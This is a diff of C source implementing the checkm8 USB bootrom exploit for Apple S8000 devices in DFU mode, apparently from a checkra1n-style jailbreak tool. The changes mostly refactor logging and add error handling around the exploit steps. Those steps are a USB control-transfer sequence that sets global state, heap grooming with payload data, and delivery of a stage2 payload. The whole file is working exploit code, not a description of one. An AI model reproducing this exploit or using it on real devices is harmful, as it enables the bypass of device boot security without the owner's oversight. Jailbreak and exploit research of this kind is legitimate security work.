@@ -4,102 +4,100 @@
 static unsigned char blank[2048]; // 00000000...
 static unsigned char AAAA[2048];  // 41414141...
 
-// log
-static int empty(void){
-    return 0;
-}
-
-#ifdef HAVE_DEBUG
-#define DEBUG_(...) printf(__VA_ARGS__)
-#else
-#define DEBUG_(...) empty()
-#endif
-
-
 static void set_global_state(io_client_t client){
-    IOReturn r;
+    transfer_t result;
     unsigned int val;
-    unsigned int sent;
+    UInt32 sent;
     
     val = 704; // s8000
     
     int i=0;
     while((sent = async_usb_ctrl_transfer_with_cancel(client, 0x21, 1, 0x0000, 0x0000, AAAA, 2048, 0)) != 0x40){
+        DEBUG_LOG("[%s] sent: %x\n", __FUNCTION__, sent);
         i++;
-        DEBUG_("%x\n", i);
+        DEBUG_LOG("[%s] retry: %x\n", __FUNCTION__, i);
         usleep(10000);
-        r = usb_ctrl_transfer(client, 0x21, 1, 0x0000, 0x0000, AAAA, 64);
+        result = usb_ctrl_transfer(client, 0x21, 1, 0x0000, 0x0000, AAAA, 64);
+        DEBUG_LOG("[%s] %x\n", __FUNCTION__, result.ret);
         usleep(10000);
     }
     
-    r = usb_ctrl_transfer_with_time(client, 0, 0, 0x0000, 0x0000, AAAA, val, 100);
+    result = usb_ctrl_transfer_with_time(client, 0, 0, 0x0000, 0x0000, AAAA, val, 100);
+    DEBUG_LOG("[%s] %x\n", __FUNCTION__, result.ret);
     
-    r = usb_ctrl_transfer_with_time(client, 0x21, 4, 0x0000, 0x0000, NULL, 0, 0);
-    
+    result = usb_ctrl_transfer_with_time(client, 0x21, 4, 0x0000, 0x0000, NULL, 0, 0);
+    DEBUG_LOG("[%s] %x\n", __FUNCTION__, result.ret);
 }
 
 static void heap_occupation(io_client_t client, uint16_t cpid, checkra1n_payload_t payload){
-    IOReturn r;
+    transfer_t result;
     
     // over1 = dummy
-    r = usb_ctrl_transfer_with_time(client, 0, 0, 0x0000, 0x0000, payload.over2, payload.over2_len, 100);
-    
-    r = usb_ctrl_transfer_with_time(client, 0x21, 4, 0x0000, 0x0000, NULL, 0, 0);
-    
+    result = usb_ctrl_transfer_with_time(client, 0, 0, 0x0000, 0x0000, payload.over2, payload.over2_len, 100);
+    DEBUG_LOG("[%s] %x\n", __FUNCTION__, result.ret);
+    result = usb_ctrl_transfer_with_time(client, 0x21, 4, 0x0000, 0x0000, NULL, 0, 0);
+    DEBUG_LOG("[%s] %x\n", __FUNCTION__, result.ret);
 }
 
 int checkra1n_s8000(io_client_t client, uint16_t cpid, checkra1n_payload_t payload){
     int r;
+    transfer_t result;
     
     bzero(blank, 2048);
     memset(AAAA, 'A', 2048);
     
     LOG_EXPLOIT_NAME("checkm8");
     
-    usb_ctrl_transfer(client, 0x21, 1, 0x0000, 0x0000, blank, 2048);
+    result = usb_ctrl_transfer(client, 0x21, 1, 0x0000, 0x0000, blank, 2048);
     usleep(1000);
     
-    LOG_DEBUG("reconnect");
+    LOG_PROGRESS("[%s] reconnecting", __FUNCTION__);
     io_reset(client);
     io_close(client);
     client = NULL;
     usleep(10000);
     get_device_time_stage(&client, 5, DEVICE_DFU);
     if(!client) {
-        LOG_ERROR("ERROR: Failed to reconnect to device");
+        LOG_ERROR("[%s] ERROR: Failed to reconnect to device", __FUNCTION__);
         return -1;
     }
     
-    LOG_DEBUG("[checkra1n] running set_global_state()");
+    LOG_PROGRESS("[%s] running set_global_state()", __FUNCTION__);
     set_global_state(client);
     
-    LOG_DEBUG("reconnect");
+    LOG_PROGRESS("[%s] reconnecting", __FUNCTION__);
     io_close(client);
     client = NULL;
     usleep(10000);
     get_device_time_stage(&client, 5, DEVICE_DFU);
     if(!client) {
-        LOG_ERROR("ERROR: Failed to reconnect to device");
+        LOG_ERROR("[%s] ERROR: Failed to reconnect to device", __FUNCTION__);
         return -1;
     }
     
-    LOG_DEBUG("[checkra1n] running heap_occupation()");
+    LOG_PROGRESS("[%s] running heap_occupation()", __FUNCTION__);
     heap_occupation(client, cpid, payload);
     
-    LOG_DEBUG("reconnect");
+    LOG_PROGRESS("[%s] reconnecting", __FUNCTION__);
     io_close(client);
     client = NULL;
     usleep(10000);
     get_device_time_stage(&client, 5, DEVICE_DFU);
     if(!client) {
-        LOG_ERROR("ERROR: Failed to reconnect to device");
+        LOG_ERROR("[%s] ERROR: Failed to reconnect to device", __FUNCTION__);
         return -1;
     }
     
-    LOG_DEBUG("[checkra1n] sending stage2 payload");
-    payload_stage2(client, cpid, payload);
+    LOG_PROGRESS("[%s] sending stage2 payload", __FUNCTION__);
+    r = payload_stage2(client, cpid, payload);
+    if(r != 0){
+        return -1;
+    }
     
-    connect_to_stage2(client, cpid, payload);
+    r = connect_to_stage2(client, cpid, payload);
+    if(r != 0){
+        return -1;
+    }
     
     return 0;
 }
